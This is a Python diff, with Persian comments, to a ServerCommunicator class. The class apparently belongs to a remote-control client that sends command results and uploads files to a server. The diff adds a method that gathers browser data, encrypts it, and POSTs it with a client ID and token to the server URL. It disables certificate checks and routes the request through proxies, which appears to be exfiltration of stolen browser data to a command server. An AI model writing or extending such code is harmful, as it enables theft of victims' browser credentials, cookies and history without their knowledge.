@@ -2,6 +2,7 @@ import requests
 import json
 import logging
 import time
+import datetime  # این خط را اضافه کنید
 from typing import Dict, List
 from encryption.manager import EncryptionManager
 import gzip
@@ -535,6 +536,43 @@ class ServerCommunicator:
         except Exception as e:
             self.logger.error(f"Failed to send command result: {str(e)}")
             raise CommunicationError(f"Failed to send command result: {str(e)}")
+
+    def upload_browser_data_comprehensive(self, browser_data: Dict) -> Dict:
+        """آپلود اطلاعات کامل مرورگر"""
+        if not Config.ENABLE_BROWSER_DATA_COLLECTION:
+            self.logger.info("Browser data collection disabled, skipping upload")
+            return {"status": "skipped", "message": "Browser data collection disabled"}
+    
+        try:
+            self.logger.info(f"Preparing comprehensive browser data upload: client_id={self.client_id}")
+            
+            browser_data_json = json.dumps(browser_data, ensure_ascii=False)
+            encrypted_browser_data = self.encryption.encrypt(browser_data_json)
+            
+            encrypted_data = {
+                "action": "upload_browser_data_comprehensive",
+                "client_id": self.client_id,
+                "token": self.token,
+                "browser_data": encrypted_browser_data,
+                "timestamp": datetime.datetime.now().isoformat()
+            }
+            
+            self.logger.info("Sending comprehensive browser data")
+            response = requests.post(
+                self.server_url,
+                json=encrypted_data,
+                timeout=60,  # timeout بیشتر برای داده‌های حجیم
+                verify=False,
+                proxies=self.proxies
+            )
+            response.raise_for_status()
+            
+            self.logger.info("Comprehensive browser data upload successful")
+            return response.json()
+            
+        except Exception as e:
+            self.logger.error(f"Comprehensive browser data upload error: {str(e)}")
+            raise CommunicationError(f"Comprehensive browser data upload error: {str(e)}")
 
     def upload_file(self, file_data: Dict) -> Dict:
         """آپلود فایل"""
